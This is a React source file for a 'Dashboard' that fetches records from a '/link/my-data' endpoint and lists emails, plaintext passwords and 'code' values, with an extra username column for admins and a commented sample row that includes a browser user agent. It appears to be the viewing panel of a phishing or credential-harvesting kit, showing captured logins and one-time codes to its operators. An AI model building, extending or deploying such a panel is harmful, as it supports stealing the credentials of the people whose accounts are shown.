import React, { useContext, useEffect, useState } from 'react'
import './Dashboard.css'
import axios from 'axios'
import { AuthContext } from '../Store/AuthContext'

const Dashboard = () => {

  const { URL, jwtToken, reloadCount } = useContext(AuthContext)

  const [allData, setAllData] = useState()

  const [role, setRole] = useState()

  const getData = async () => {
    try {
      const response = await axios.post(`${URL}/link/my-data`,
        {},
        {
          headers: {
            Authorization: `Bearer ${jwtToken}`
          }
        }
      )
      if (response.data.success) {
        setRole(response.data.role)
        setAllData(response.data.validData)
      }
    } catch (error) {
      console.log(error.message)
    }
  }

  useEffect(
    () => {
      getData()
    }, [reloadCount]
  )

  return (
    <div className=' dashboard-container min-h-screen'>
      <h2 className=' text-xl text-center text-stone-500 mb-10 py-7 border-slate-500 border-b-2'>Dashboard Details</h2>
      <table className='link-table w-full border-collapse'>
        <thead className=' w-full'>

          <tr className=' w-full h-10 bg-gray-500 text-white font-light'>
            <th className='w-20 rounded-lg'>ID</th>
            {role === 'admin' &&
              <th className='w-60 text-start rounded-lg'>User</th>}
            <th className='w-60 text-center rounded-lg'>Email</th>
            <th className='w-60 text-center rounded-lg'>Pass</th>
            <th className=' rounded-lg'>Code</th>
          </tr>

        </thead>

        <tbody>

          {/* <tr className='w-full text-sm'>
            <td className=' text-center'>01</td>
            <td>email</td>
            <td>pass</td>
            <td>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36</td>
          </tr> */}

          {
            allData && allData.slice().reverse().map((element, id) => {
              return (
                <tr className='w-full text-sm' key={element._id}>
                  <td className=' text-center'>{id + 1}</td>
                  {role === 'admin' && <td>{element.username}</td>}
                  <td>{element.email}</td>
                  <td>{element.pass}</td>
                  <td>{element.code}</td>
                </tr>
              )
            })
          }


        </tbody>
      </table>

    </div>
  )
}

export default Dashboard